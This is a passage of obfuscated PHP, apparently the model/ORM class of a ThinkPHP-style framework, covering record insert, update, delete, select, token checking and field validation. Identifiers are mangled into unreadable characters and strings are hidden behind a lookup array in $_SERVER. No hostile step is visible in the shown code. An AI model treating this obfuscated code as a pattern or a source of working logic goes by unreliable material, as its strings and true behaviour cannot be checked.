think_parse_name(substr($Ã³ğÚ‚È, 10)); $Ú¯ÈæÂ”[$šæ½÷õ] = $İüÇÌûÑ[0]; return $this->where($Ú¯ÈæÂ”)->getField($İüÇÌûÑ[1]); } elseif (isset($this->_scope[$Ã³ğÚ‚È])) { return $this->scope($Ã³ğÚ‚È, $İüÇÌûÑ[0]); } elseif (method_exists($this, $Ã³ğÚ‚È)) { array_unshift($İüÇÌûÑ, $Ã³ğÚ‚È); return call_user_func_array(array($this, $µ¦‰ëİş[353]), $İüÇÌûÑ); } else { return call_user_func_array(array(parent, $Ã³ğÚ‚È), $İüÇÌûÑ); } } protected function call() { $¯òâÂõ =& $_SERVER[É¨™èà]; $Ñã¼øÕà = func_get_args(); $ûš„Ì¹Ø = array_shift($Ñã¼øÕà); $…ùóÅâ¯ = $ûš„Ì¹Ø; if (is_array($ûš„Ì¹Ø)) { $…ùóÅâ¯ = $ûš„Ì¹Ø[1]; $ûš„Ì¹Ø = $ûš„Ì¹Ø[0]; } $Ÿ¡úÏ›¼ = count($Ñã¼øÕà) - 1; if (isset($Ñã¼øÕà[$Ÿ¡úÏ›¼]) && $Ñã¼øÕà[$Ÿ¡úÏ›¼] === $ûš„Ì¹Ø) { think_exception(__CLASS__ . $¯òâÂõ[4] . $ûš„Ì¹Ø . think_lang($¯òâÂõ[354])); return; } $Ñã¼øÕà[] = $ûš„Ì¹Ø; if (method_exists($this, $¯òâÂõ[355])) { $ë¯šô„¨ = call_user_func_array(array($this, $¯òâÂõ[356]), array($…ùóÅâ¯, $Ñã¼øÕà)); if (!is_null($ë¯šô„¨) && $ë¯šô„¨ !== !1) { return $ë¯šô„¨; } } $õ¬„Ë³ = call_user_func_array(array($this, $ûš„Ì¹Ø), $Ñã¼øÕà); if (method_exists($this, $¯òâÂõ[357])) { $ë¯šô„¨ = call_user_func_array(array($this, $¯òâÂõ[358]), array($…ùóÅâ¯, $Ñã¼øÕà, $õ¬„Ë³)); if ($ë¯šô„¨) { return $ë¯šô„¨; } } return $õ¬„Ë³; } protected function _initialize() { } protected function _facade($£˜Ÿøš) { $ı•ŞÖŠ¦ =& $_SERVER[É¨™èà]; if (!empty($this->fields)) { foreach ($£˜Ÿøš as $²ˆú·§š => $—ı°á¹) { if (is_array($this->fields) && !in_array($²ˆú·§š, $this->fields, !0)) { unset($£˜Ÿøš[$²ˆú·§š]); } elseif (is_scalar($—ı°á¹)) { $this->_parseType($£˜Ÿøš, $²ˆú·§š); } } } if (!empty($this->options[$ı•ŞÖŠ¦[359]])) { $£˜Ÿøš = array_map($this->options[$ı•ŞÖŠ¦[359]], $£˜Ÿøš); unset($this->options[$ı•ŞÖŠ¦[359]]); } $this->_beforeWrite($£˜Ÿøš); return $£˜Ÿøš; } protected function _beforeWrite(&$ãŸ¼ç¬à) { } public function add($¬ˆêä† = '', $÷¯Œ¬­¸ = array(), $ÜùÙá· = false) { if (empty($¬ˆêä†)) { if (!empty($this->data)) { $¬ˆêä† = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[É¨™èà][360]); return !1; } } $÷¯Œ¬­¸ = $this->_parseOptions($÷¯Œ¬­¸); $¬ˆêä† = $this->_facade($¬ˆêä†); if (!1 === $this->_beforeInsert($¬ˆêä†, $÷¯Œ¬­¸)) { return !1; } $˜äªíûä = $this->db->insert($¬ˆêä†, $÷¯Œ¬­¸, $ÜùÙá·); if (!1 !== $˜äªíûä) { $Å€ñÚ®ç = $this->getLastInsID(); if ($Å€ñÚ®ç) { $¬ˆêä†[$this->getPk()] = $Å€ñÚ®ç; $this->_after_insert($¬ˆêä†, $÷¯Œ¬­¸); return $Å€ñÚ®ç; } $this->_after_insert($¬ˆêä†, $÷¯Œ¬­¸); } return $˜äªíûä; } protected function _beforeInsert(&$Íì‡˜ñé, $¬¿£¿êã) { } protected function _after_insert($«•áÙ”É, $Œ³´úË) { } public function addAll($«¦’°¶©, $†Î‰×ı = array(), $­¹ «Ò = false) { $©˜¥µĞÈ =& $_SERVER[É¨™èà]; if (empty($«¦’°¶©)) { $this->error = think_lang($©˜¥µĞÈ[360]); return !1; } $†Î‰×ı = $this->_parseOptions($†Î‰×ı); foreach ($«¦’°¶© as $Ü“„Ÿßï => $°ıŒ¡Ûø) { $«¦’°¶©[$Ü“„Ÿßï] = $this->_facade($°ıŒ¡Ûø); } if (method_exists($this->db, $©˜¥µĞÈ[361])) { $ù»Åõƒ = $this->db->insertAll($«¦’°¶©, $†Î‰×ı, $­¹ «Ò); } else { $this->startTrans(); foreach ($«¦’°¶© as $Ü“„Ÿßï => $°ıŒ¡Ûø) { $ù»Åõƒ = $this->db->insert($°ıŒ¡Ûø, $†Î‰×ı, $­¹ «Ò); } $this->commit(); } if (!1 !== $ù»Åõƒ) { $íõßï¶Õ = $this->getLastInsID(); if ($íõßï¶Õ) { return $íõßï¶Õ; } } return $ù»Åõƒ; } public function selectAdd($µşß‹ó¶ = '', $‡ãÙİı = '', $Ó´®«ïù = array()) { $ıÛ‘šêÓ =& $_SERVER[É¨™èà]; $Ó´®«ïù = $this->_parseOptions($Ó´®«ïù); if (!1 === ($Ïú±Ş²Ÿ = $this->db->selectInsert($µşß‹ó¶ ? $µşß‹ó¶ : $Ó´®«ïù[$ıÛ‘šêÓ[362]], $‡ãÙİı ? $‡ãÙİı : $this->getTableName(), $Ó´®«ïù))) { $this->error = think_lang($ıÛ‘šêÓ[363]); return !1; } else { return $Ïú±Ş²Ÿ; } } public function save($ÆÁ»ğ“ú = '', $‹‰ëì¬û = array()) { $ëÀÉ¹×í =& $_SERVER[É¨™èà]; if (empty($ÆÁ»ğ“ú)) { if (!empty($this->data)) { $ÆÁ»ğ“ú = $this->data; $this->data = array(); } else { $this->error = think_lang($ëÀÉ¹×í[360]); return !1; } } $ÆÁ»ğ“ú = $this->_facade($ÆÁ»ğ“ú); $‹‰ëì¬û = $this->_parseOptions($‹‰ëì¬û); $øçÒùÊ“ = $this->getPk(); if (!isset($‹‰ëì¬û[$ëÀÉ¹×í[364]])) { if (isset($ÆÁ»ğ“ú[$øçÒùÊ“])) { $Ï«ÚæŸº[$øçÒùÊ“] = $ÆÁ»ğ“ú[$øçÒùÊ“]; $‹‰ëì¬û[$ëÀÉ¹×í[364]] = $Ï«ÚæŸº; unset($ÆÁ»ğ“ú[$øçÒùÊ“]); } else { $this->error = think_lang($ëÀÉ¹×í[363]); return !1; } } if (is_array($‹‰ëì¬û[$ëÀÉ¹×í[364]]) && isset($‹‰ëì¬û[$ëÀÉ¹×í[364]][$øçÒùÊ“])) { $¸¢ó¨ò” = $‹‰ëì¬û[$ëÀÉ¹×í[364]][$øçÒùÊ“]; } if (!1 === $this->_beforeUpdate($ÆÁ»ğ“ú, $‹‰ëì¬û)) { return !1; } $îíÈ«ÇÖ = $this->db->update($ÆÁ»ğ“ú, $‹‰ëì¬û); if (!1 !== $îíÈ«ÇÖ) { if (isset($¸¢ó¨ò”)) { $ÆÁ»ğ“ú[$øçÒùÊ“] = $¸¢ó¨ò”; } $this->_afterUpdate($ÆÁ»ğ“ú, $‹‰ëì¬û); } return $îíÈ«ÇÖ; } protected function _beforeUpdate(&$ßÔü£÷˜, $µØûÃÎü) { } protected function _afterUpdate($ßØÛÂ†, $àï¡úĞø) { } public function delete($ÜÚÜ„ù¾ = array()) { $¬Ÿƒ­ü =& $_SERVER[É¨™èà]; if (empty($ÜÚÜ„ù¾) && empty($this->options[$¬Ÿƒ­ü[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Á˜Õ½Í = $this->getPk(); if (is_numeric($ÜÚÜ„ù¾) || is_string($ÜÚÜ„ù¾)) { if (strpos($ÜÚÜ„ù¾, $¬Ÿƒ­ü[50])) { $íŒæÚ¨’[$Á˜Õ½Í] = array($¬Ÿƒ­ü[365], $ÜÚÜ„ù¾); } else { $íŒæÚ¨’[$Á˜Õ½Í] = $ÜÚÜ„ù¾; } $this->options[$¬Ÿƒ­ü[364]] = $íŒæÚ¨’; } $ÜÚÜ„ù¾ = $this->_parseOptions(); if (is_array($ÜÚÜ„ù¾[$¬Ÿƒ­ü[364]]) && isset($ÜÚÜ„ù¾[$¬Ÿƒ­ü[364]][$Á˜Õ½Í])) { $§“Èú”² = $ÜÚÜ„ù¾[$¬Ÿƒ­ü[364]][$Á˜Õ½Í]; } $ôáÊ¿í± = $this->db->delete($ÜÚÜ„ù¾); if (!1 !== $ôáÊ¿í±) { $²ë÷å = array(); if (isset($§“Èú”²)) { $²ë÷å[$Á˜Õ½Í] = $§“Èú”²; } $this->_after_delete($²ë÷å, $ÜÚÜ„ù¾); } return $ôáÊ¿í±; } protected function _after_delete($‘Ò‡„Ëë, $îèùä„‘) { } public function select($õïïõÂ = array()) { $†ò…î¤Ã =& $_SERVER[É¨™èà]; if (is_string($õïïõÂ) || is_numeric($õïïõÂ)) { $ÒØÂ— = $this->getPk(); if (strpos($õïïõÂ, $†ò…î¤Ã[50])) { $ùÒ ­®[$ÒØÂ—] = array($†ò…î¤Ã[365], $õïïõÂ); } else { $ùÒ ­®[$ÒØÂ—] = $õïïõÂ; } $this->options[$†ò…î¤Ã[364]] = $ùÒ ­®; } elseif (!1 === $õïïõÂ) { $õïïõÂ = $this->_parseOptions(); return $†ò…î¤Ã[366] . $this->db->buildSelectSql($õïïõÂ) . $†ò…î¤Ã[367]; } $õïïõÂ = $this->_parseOptions(); $¥¢¼íŞø = $this->db->select($õïïõÂ); if (!1 === $¥¢¼íŞø) { return !1; } if (empty($¥¢¼íŞø)) { return null; } $this->_afterSelect($¥¢¼íŞø, $õïïõÂ); return $¥¢¼íŞø; } protected function _afterSelect(&$ÍæÛŠü, $­»ïåİº) { } public function buildSql($¯²ì©ë¿ = array()) { $ëÈªØ²Ø =& $_SERVER[É¨™èà]; $¯²ì©ë¿ = $this->_parseOptions($¯²ì©ë¿); return $ëÈªØ²Ø[366] . $this->db->buildSelectSql($¯²ì©ë¿) . $ëÈªØ²Ø[367]; } public function optionsValue($õ“ï§¤ß = null) { if (is_null($õ“ï§¤ß)) { return $this->options; } elseif (is_array($õ“ï§¤ß)) { $this->options = array_merge($this->options, $õ“ï§¤ß); } } protected function _parseOptions($²Ó‡–µ‡ = array()) { $íñé‹ =& $_SERVER[É¨™èà]; if (is_array($²Ó‡–µ‡)) { $²Ó‡–µ‡ = array_merge($this->options, $²Ó‡–µ‡); } $this->options = array(); if (!isset($²Ó‡–µ‡[$íñé‹[368]])) { $²Ó‡–µ‡[$íñé‹[368]] = $this->getTableName(); $¬»©É¦ƒ = $this->fields; } else { $¬»©É¦ƒ = $this->getDbFields(); } if (!empty($²Ó‡–µ‡[$íñé‹[369]])) { $²Ó‡–µ‡[$íñé‹[368]] .= $íñé‹[53] . $²Ó‡–µ‡[$íñé‹[369]]; } $²Ó‡–µ‡[$íñé‹[370]] = $this->name; if (isset($²Ó‡–µ‡[$íñé‹[364]]) && is_array($²Ó‡–µ‡[$íñé‹[364]]) && !empty($¬»©É¦ƒ) && !isset($²Ó‡–µ‡[$íñé‹[371]]) && !isset($²Ó‡–µ‡[$íñé‹[368]])) { foreach ($²Ó‡–µ‡[$íñé‹[364]] as $£¶ã–€Ò => $¦–Ÿ™Ê) { $£¶ã–€Ò = trim($£¶ã–€Ò); if (in_array($£¶ã–€Ò, $¬»©É¦ƒ, !0)) { if (is_scalar($¦–Ÿ™Ê)) { $this->_parseType($²Ó‡–µ‡[$íñé‹[364]], $£¶ã–€Ò); } } elseif (!is_numeric($£¶ã–€Ò) && $íñé‹[11] != substr($£¶ã–€Ò, 0, 1) && !1 === strpos($£¶ã–€Ò, $íñé‹[10]) && !1 === strpos($£¶ã–€Ò, $íñé‹[349]) && !1 === strpos($£¶ã–€Ò, $íñé‹[215]) && !1 === strpos($£¶ã–€Ò, $íñé‹[287])) { unset($²Ó‡–µ‡[$íñé‹[364]][$£¶ã–€Ò]); } } } $this->_options_filter($²Ó‡–µ‡); return $²Ó‡–µ‡; } protected function _options_filter(&$¨´Õ‚Õ) { } protected function _parseType(&$¨ğ€òØÇ, $òëè…ŸÏ) { $ÙÂÛª“Š =& $_SERVER[É¨™èà]; if (empty($this->options[$ÙÂÛª“Š[372]][$ÙÂÛª“Š[4] . $òëè…ŸÏ])) { $ŞóéÇÂí = strtolower($this->fields[$ÙÂÛª“Š[341]][$òëè…ŸÏ]); if (!1 !== strpos($ŞóéÇÂí, $ÙÂÛª“Š[373])) { } elseif (!1 === strpos($ŞóéÇÂí, $ÙÂÛª“Š[374]) && !1 !== strpos($ŞóéÇÂí, $ÙÂÛª“Š[375])) { $¨ğ€òØÇ[$òëè…ŸÏ] = intval($¨ğ€òØÇ[$òëè…ŸÏ]); } elseif (!1 !== strpos($ŞóéÇÂí, $ÙÂÛª“Š[376]) || !1 !== strpos($ŞóéÇÂí, $ÙÂÛª“Š[377])) { $¨ğ€òØÇ[$òëè…ŸÏ] = floatval($¨ğ€òØÇ[$òëè…ŸÏ]); } elseif (!1 !== strpos($ŞóéÇÂí, $ÙÂÛª“Š[378])) { $¨ğ€òØÇ[$òëè…ŸÏ] = (bool) $¨ğ€òØÇ[$òëè…ŸÏ]; } } } public function find($ÎïÁÎó = array()) { $Ä¤ˆ—ˆ¶ =& $_SERVER[É¨™èà]; if (is_numeric($ÎïÁÎó) || is_string($ÎïÁÎó)) { $ò¿ëËÚ[$this->getPk()] = intval($ÎïÁÎó); $this->options[$Ä¤ˆ—ˆ¶[364]] = $ò¿ëËÚ; } $this->options[$Ä¤ˆ—ˆ¶[379]] = 1; $ÎïÁÎó = $this->_parseOptions(); $Òòâ€– = $this->db->select($ÎïÁÎó); if (!1 === $Òòâ€–) { return !1; } if (empty($Òòâ€–)) { return null; } $€ÂÓ‰Ùó = $Òòâ€–[0]; $this->_afterFind($€ÂÓ‰Ùó, $ÎïÁÎó); return $€ÂÓ‰Ùó; } protected function _afterFind(&$Ğ£›à¨¡, $ÁÙæ•åş) { } protected function returnResult($˜È¼êĞé, $‹’¢¾è = '') { $æÂ›šéê =& $_SERVER[É¨™èà]; if ($‹’¢¾è) { if (is_callable($‹’¢¾è)) { return call_user_func($‹’¢¾è, $˜È¼êĞé); } switch (strtolower($‹’¢¾è)) { case $æÂ›šéê[380]: return json_encode($˜È¼êĞé); case $æÂ›šéê[381]: return xml_encode($˜È¼êĞé); } } return $˜È¼êĞé; } public function parseFieldsMap($ö–‰‚Åî, $¹ÉÔÀ Ş = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ƒíåÖÚŠ => $Œé¸Ø‚) { if ($¹ÉÔÀ Ş == 1) { if (isset($ö–‰‚Åî[$Œé¸Ø‚])) { $ö–‰‚Åî[$ƒíåÖÚŠ] = $ö–‰‚Åî[$Œé¸Ø‚]; unset($ö–‰‚Åî[$Œé¸Ø‚]); } } else { if (isset($ö–‰‚Åî[$ƒíåÖÚŠ])) { $ö–‰‚Åî[$Œé¸Ø‚] = $ö–‰‚Åî[$ƒíåÖÚŠ]; unset($ö–‰‚Åî[$ƒíåÖÚŠ]); } } } } return $ö–‰‚Åî; } public function setField($º›í†½§, $Ö¨óËêö = '') { if (is_array($º›í†½§)) { $ôì•·¹ı = $º›í†½§; } else { $ôì•·¹ı[$º›í†½§] = $Ö¨óËêö; } return $this->save($ôì•·¹ı); } public function setAdd($üÎÏ«÷è, $ÌÍŠÎ³ = 1) { $Ü¡¯Ó‹ô =& $_SERVER[É¨™èà]; $µÖ¶í•¹ = $üÎÏ«÷è . $Ü¡¯Ó‹ô[382] . $ÌÍŠÎ³; if ($ÌÍŠÎ³ < 0) { $µÖ¶í•¹ = $üÎÏ«÷è . $ÌÍŠÎ³; } return $this->setField($üÎÏ«÷è, array($Ü¡¯Ó‹ô[383], $µÖ¶í•¹)); } public function getField($ÎûŒÎè†, $ª™Â‘‰Ø = null) { $©Œíº¬û =& $_SERVER[É¨™èà]; $¶¦â¯­˜[$©Œíº¬û[362]] = $ÎûŒÎè†; $¶¦â¯­˜ = $this->_parseOptions($¶¦â¯­˜); $ÎûŒÎè† = trim($ÎûŒÎè†); if (strpos($ÎûŒÎè†, $©Œíº¬û[50])) { if (!isset($¶¦â¯­˜[$©Œíº¬û[379]])) { $¶¦â¯­˜[$©Œíº¬û[379]] = is_numeric($ª™Â‘‰Ø) ? $ª™Â‘‰Ø : $©Œíº¬û[12]; } $ó“ÖĞéœ = $this->db->select($¶¦â¯­˜); if (!empty($ó“ÖĞéœ)) { $Ÿ”İ˜ä = explode($©Œíº¬û[50], $ÎûŒÎè†); $ÎûŒÎè† = array_keys($ó“ÖĞéœ[0]); $›«üšÅÃ = array_shift($ÎûŒÎè†); $‹›¶èâ = array_shift($ÎûŒÎè†); $¸§­ÀÀ = array(); $Ä¤…É¯Æ = count($Ÿ”İ˜ä); foreach ($ó“ÖĞéœ as $‚†„„„ş) { $İ³ÎËÆÓ = $‚†„„„ş[$›«üšÅÃ]; if (2 == $Ä¤…É¯Æ) { $¸§­ÀÀ[$İ³ÎËÆÓ] = $‚†„„„ş[$‹›¶èâ]; } else { $¸§­ÀÀ[$İ³ÎËÆÓ] = is_string($ª™Â‘‰Ø) ? implode($ª™Â‘‰Ø, $‚†„„„ş) : $‚†„„„ş; } } return $¸§­ÀÀ; } } else { if (!0 !== $ª™Â‘‰Ø) { $¶¦â¯­˜[$©Œíº¬û[379]] = is_numeric($ª™Â‘‰Ø) ? $ª™Â‘‰Ø : 1; } if ($ª™Â‘‰Ø === $©Œíº¬û[344]) { unset($¶¦â¯­˜[$©Œíº¬û[379]]); } $‚†„„„ş = $this->db->select($¶¦â¯­˜); if (!empty($‚†„„„ş)) { if ($ª™Â‘‰Ø === $©Œíº¬û[344]) { return reset($‚†„„„ş[0]); } if (!0 !== $ª™Â‘‰Ø && 1 == $¶¦â¯­˜[$©Œíº¬û[379]]) { return reset($‚†„„„ş[0]); } foreach ($‚†„„„ş as $Û…ÜÙÜ‘) { $Öë˜‚ü¼[] = $Û…ÜÙÜ‘[$ÎûŒÎè†]; } return $Öë˜‚ü¼; } } return null; } public function create($€…Ê£Üè = '', $àñ‡ƒù¨ = '') { $°µÉ½Å =& $_SERVER[É¨™èà]; if (empty($€…Ê£Üè)) { $€…Ê£Üè = $_POST; } elseif (is_object($€…Ê£Üè)) { $€…Ê£Üè = get_object_vars($€…Ê£Üè); } if (empty($€…Ê£Üè) || !is_array($€…Ê£Üè)) { $this->error = think_lang($°µÉ½Å[360]); return !1; } $€…Ê£Üè = $this->parseFieldsMap($€…Ê£Üè, 0); $àñ‡ƒù¨ = $àñ‡ƒù¨ ? $àñ‡ƒù¨ : (!empty($€…Ê£Üè[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$°µÉ½Å[362]])) { $™¥½–Ÿ = $this->options[$°µÉ½Å[362]]; unset($this->options[$°µÉ½Å[362]]); } elseif ($àñ‡ƒù¨ == THINK_MODEL_INSERT && isset($this->insertFields)) { $™¥½–Ÿ = $this->insertFields; } elseif ($àñ‡ƒù¨ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $™¥½–Ÿ = $this->updateFields; } if (isset($™¥½–Ÿ)) { if (is_string($™¥½–Ÿ)) { $™¥½–Ÿ = explode($°µÉ½Å[50], $™¥½–Ÿ); } if (think_config($°µÉ½Å[384])) { $™¥½–Ÿ[] = think_config($°µÉ½Å[385]); } foreach ($€…Ê£Üè as $®áãßõì => $¢å³î¦÷) { if (!in_array($®áãßõì, $™¥½–Ÿ)) { unset($€…Ê£Üè[$®áãßõì]); } } } if (!$this->autoValidation($€…Ê£Üè, $àñ‡ƒù¨)) { return !1; } if (!$this->autoCheckToken($€…Ê£Üè)) { $this->error = think_lang($°µÉ½Å[386]); return !1; } if ($this->autoCheckFields) { $™¥½–Ÿ = $this->getDbFields(); foreach ($€…Ê£Üè as $®áãßõì => $¢å³î¦÷) { if (!in_array($®áãßõì, $™¥½–Ÿ)) { unset($€…Ê£Üè[$®áãßõì]); } elseif (MAGIC_QUOTES_GPC && is_string($¢å³î¦÷)) { $€…Ê£Üè[$®áãßõì] = stripslashes($¢å³î¦÷); } } } $this->autoOperation($€…Ê£Üè, $àñ‡ƒù¨); $this->data = $€…Ê£Üè; return $€…Ê£Üè; } public function autoCheckToken($ö¶ú®é°) { $Ê´Ñ›¡Ò =& $_SERVER[É¨™èà]; if (isset($this->options[$Ê´Ñ›¡Ò[387]]) && !$this->options[$Ê´Ñ›¡Ò[387]]) { return !0; } if (think_config($Ê´Ñ›¡Ò[384])) { $©­óÎƒ = think_config($Ê´Ñ›¡Ò[385]); if (!isset($ö¶ú®é°[$©­óÎƒ]) || Session::get($©­óÎƒ)) { return !1; } list($Ç¦ÏÍ, $ù‡¦Óş) = explode($Ê´Ñ›¡Ò[11], $ö¶ú®é°[$©­óÎƒ]); if ($ù‡¦Óş && Session::get($©­óÎƒ . $Ê´Ñ›¡Ò[10] . $Ç¦ÏÍ) === $ù‡¦Óş) { Session::remove($©­óÎƒ . $Ê´Ñ›¡Ò[10] . $Ç¦ÏÍ); return !0; } if (think_config($Ê´Ñ›¡Ò[388])) { Session::remove($©­óÎƒ . $Ê´Ñ›¡Ò[10] . $Ç¦ÏÍ); } return !1; } return !0; } public function regex($®…œ‘µ, $‚°¡ƒ‚¬) { $‚¤…× =& $_SERVER[É¨™èà]; $½íøõ³¥ = array($‚¤…×[389] => $‚¤…×[390], $‚¤…×[391] => $‚¤…×[392], $‚¤…×[393] => $‚¤…×[394], $‚¤…×[395] => $‚¤…×[396], $‚¤…×[397] => $‚¤…×[398], $‚¤…×[399] => $‚¤…×[400], $‚¤…×[401] => $‚¤…×[402], $‚¤…×[377] => $‚¤…×[403], $‚¤…×[404] => $‚¤…×[405]); if (isset($½íøõ³¥[strtolower($‚°¡ƒ‚¬)])) { $‚°¡ƒ‚¬ = $½íøõ³¥[strtolower($‚°¡ƒ‚¬)]; } return preg_match($‚°¡ƒ‚¬, $®…œ‘µ) === 1; } private function autoOperation(&$ÒƒÙ»„, $èÜõŞ³¢) { $ïõ½â€† =& $_SERVER[É¨™èà]; if (!empty($this->options[$ïõ½â€†[406]])) { $ïÆâÎñÎ = $this->options[$ïõ½â€†[406]]; unset($this->options[$ïõ½â€†[406]]); } elseif (!empty($this->_auto)) { $ïÆâÎñÎ = $this->_auto; } if (isset($ïÆâÎñÎ)) { foreach ($ïÆâÎñÎ as $è¤ï²¯) { if (empty($è¤ï²¯[2])) { $è¤ï²¯[2] = THINK_MODEL_INSERT; } if ($èÜõŞ³¢ == $è¤ï²¯[2] || $è¤ï²¯[2] == THINK_MODEL_BOTH) { switch (trim($è¤ï²¯[3])) { case $ïõ½â€†[407]: case $ïõ½â€†[408]: $´ƒ¡Úù¬ = isset($è¤ï²¯[4]) ? (array) $è¤ï²¯[4] : array(); if (isset($ÒƒÙ»„[$è¤ï²¯[0]])) { array_unshift($´ƒ¡Úù¬, $ÒƒÙ»„[$è¤ï²¯[0]]); } if ($ïõ½â€†[407] == $è¤ï²¯[3]) { $ÒƒÙ»„[$è¤ï²¯[0]] = call_user_func_array($è¤ï²¯[1], $´ƒ¡Úù¬); } else { $ÒƒÙ»„[$è¤ï²¯[0]] = call_user_func_array(array(&$this, $è¤ï²¯[1]), $´ƒ¡Úù¬); } break; case $ïõ½â€†[362]: $ÒƒÙ»„[$è¤ï²¯[0]] = $ÒƒÙ»„[$è¤ï²¯[1]]; break; case $ïõ½â€†[409]: if ($ïõ½â€†[12] === $ÒƒÙ»„[$è¤ï²¯[0]]) { unset($ÒƒÙ»„[$è¤ï²¯[0]]); } break; case $ïõ½â€†[410]: default: $ÒƒÙ»„[$è¤ï²¯[0]] = $è¤ï²¯[1]; } if (!1 === $ÒƒÙ»„[$è¤ï²¯[0]]) { unset($ÒƒÙ»„[$è¤ï²¯[0]]); } } } } return $ÒƒÙ»„; } protected function autoValidation($ö‹„èÌÀ, $Í¸ş) { $å–äªÀ =& $_SERVER[É¨™èà]; if (!empty($this->options[$å–äªÀ[411]])) { $è“—áÀ = $this->options[$å–äªÀ[411]]; unset($this->options[$å–äªÀ[411]]); } elseif (!empty($this->_validate)) { $è“—áÀ = $this->_validate; } if (isset($è“—áÀ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($è“—áÀ as $®ç¶øª => $Úµ®÷ÉŞ) { if (empty($Úµ®÷ÉŞ[5]) || $Úµ®÷ÉŞ[5] == THINK_MODEL_BOTH || $Úµ®÷ÉŞ[5] == $Í¸ş) { if (0 == strpos($Úµ®÷ÉŞ[2], $å–äªÀ[412]) && strpos($Úµ®÷ÉŞ[2], $å–äªÀ[413])) { $Úµ®÷ÉŞ[2] = think_lang(substr($Úµ®÷ÉŞ[2], 2, -1)); } $Úµ®÷ÉŞ[3] = isset($Úµ®÷ÉŞ[3]) ? $Úµ®÷ÉŞ[3] : THINK_EXISTS_VALIDATE; $Úµ®÷ÉŞ[4] = isset($Úµ®÷ÉŞ[4]) ? $Úµ®÷ÉŞ[4] : $å–äªÀ[414]; switch ($Úµ®÷ÉŞ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ö‹„èÌÀ, $Úµ®÷ÉŞ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($å–äªÀ[12] != trim($ö‹„èÌÀ[$Úµ®÷ÉŞ[0]])) { if (!1 === $this->_validationField($ö‹„èÌÀ, $Úµ®÷ÉŞ)) { return !1; } } break; default: if (isset($ö‹„èÌÀ[$Úµ®÷ÉŞ[0]])) { if (!1 === $this->_validationField($ö‹„èÌÀ, $Úµ®÷ÉŞ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÏŸÊ›úï, $’™ ¼¤) { if (!1 === $this->_validationFieldItem($ÏŸÊ›úï, $’™ ¼¤)) { if ($this->patchValidate) { $this->error[$’™ ¼¤[0]] = $’™ ¼¤[2]; } else { $this->error = $’™ ¼¤[2]; return !1; } } return; } protected function _validationFieldItem($û“™óÜô, $Æî¸‹Şé) { $‡‚Õˆ‰½ =& $_SERVER[É¨™èà]; switch (strtolower(trim($Æî¸‹Şé[4]))) { case $‡‚Õˆ‰½[407]: case $‡‚Õˆ‰½[408]: $À¡’¿ïÇ = isset($Æî¸‹Şé[6]) ? (array) $Æî¸‹Şé[6] : array(); if (is_string($Æî¸‹Şé[0]) && strpos($Æî¸‹Şé[0], $‡‚Õˆ‰½[50])) { $Æî¸‹Şé[0] = explode($‡‚Õˆ‰½[50], $Æî¸‹Şé[0]); } if (is_array($Æî¸‹Şé[0])) { foreach ($Æî¸‹Şé[0] as $±õ‡÷®) { $Ú´Ê¸ñâ[$±õ‡÷®] = $û“™óÜô[$±õ‡÷®]; } array_unshift($À¡’¿ïÇ, $Ú´Ê¸ñâ); } else { array_unshift($À¡’¿ïÇ, $û“™óÜô[$Æî¸‹Şé[0]]); } if ($‡‚Õˆ‰½[407] == $Æî¸‹Şé[4]) { return call_user_func_array($Æî¸‹Şé[1], $À¡’¿ïÇ); } else { return call_user_func_array(array(&$this, $Æî¸‹Şé[1]), $À¡’¿ïÇ); } case $‡‚Õˆ‰½[415]: return $û“™óÜô[$Æî¸‹Şé[0]] == $û“™óÜô[$Æî¸‹Şé[1]]; case $‡‚Õˆ‰½[416]: if (is_string($Æî¸‹Şé[0]) && strpos($Æî¸‹Şé[0], $‡‚Õˆ‰½[50])) { $Æî¸‹Şé[0] = explode($‡‚Õˆ‰½[50], $Æî¸‹Şé[0]); } $â„°İ»— = array(); if (is_array($Æî¸‹Şé[0])) { foreach ($Æî¸‹Şé[0] as $±õ‡÷®) { $â„°İ»—[$±õ‡÷®] = $û“™óÜô[$±õ‡÷®]; } } else { $â„°İ»—[$Æî¸‹Şé[0]] = $û“™óÜô[$Æî¸‹Şé[0]]; } if (!empty($û“™óÜô[$this->getPk()])) { $â„°İ»—[$this->getPk()] = array($‡‚Õˆ‰½[417], $û“™óÜô[$this->getPk()]); } if ($this->where($â„°İ»—)->find()) { return !1; } return !0; default: return $this->check($û“™óÜô[$Æî¸‹Şé[0]], $Æî¸‹Şé[1], $Æî¸‹Şé[4]); } } public function check($òâÇÆ¡, $İ‡¹ß€À, $Í›Ó¥µ = "\x72\x65\147\x65\170") { $ê÷ˆâÕª =& $_SERVER[É¨™èà]; $Í›Ó¥µ = strtolower(trim($Í›Ó¥µ)); switch ($Í›Ó¥µ) { case $ê÷ˆâÕª[7]: case $ê÷ˆâÕª[418]: $Ì¸ĞÑ‚à = is_array($İ‡¹ß€À) ? $İ‡¹ß€À : explode($ê÷ˆâÕª[50], $İ‡¹ß€À); return $Í›Ó¥µ == $ê÷ˆâÕª[7] ? in_array($òâÇÆ¡, $Ì¸ĞÑ‚à) : !in_array($òâÇÆ¡, $Ì¸ĞÑ‚à); case $ê÷ˆâÕª[419]: case $ê÷ˆâÕª[420]: if (is_array($İ‡¹ß€À)) { $–æù«Ğ× = $İ‡¹ß€À[0]; $ïÆ¨şØ  = $İ‡¹ß€À[1]; } else { list($–æù«Ğ×, $ïÆ¨şØ ) = explode($ê÷ˆâÕª[50], $İ‡¹ß€À); } return $Í›Ó¥µ == $ê÷ˆâÕª[419] ? $òâÇÆ¡ >= $–æù«Ğ× && $òâÇÆ¡ <= $ïÆ¨şØ  : $òâÇÆ¡ < $–æù«Ğ× || $òâÇÆ¡ > $ïÆ¨şØ ; case $ê÷ˆâÕª[421]: case $ê÷ˆâÕª[422]: return $Í›Ó¥µ == $ê÷ˆâÕª[421] ? $òâÇÆ¡ == $İ‡¹ß€À : $òâÇÆ¡ != $İ‡¹ß€À; case $ê÷ˆâÕª[423]: $¦ÂàüİÖ = mb_strlen($òâÇÆ¡, 